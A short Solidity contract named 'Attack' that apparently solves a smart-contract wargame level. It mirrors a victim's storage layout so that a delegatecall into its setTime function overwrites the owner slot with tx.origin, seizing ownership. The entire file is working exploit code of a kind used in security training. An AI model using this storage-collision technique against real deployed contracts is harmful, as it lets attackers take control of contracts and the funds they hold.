// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _address) public returns(address) {
        owner = tx.origin;
        console.log(owner);
        storedTime = _address;
        return (owner);
    }
}
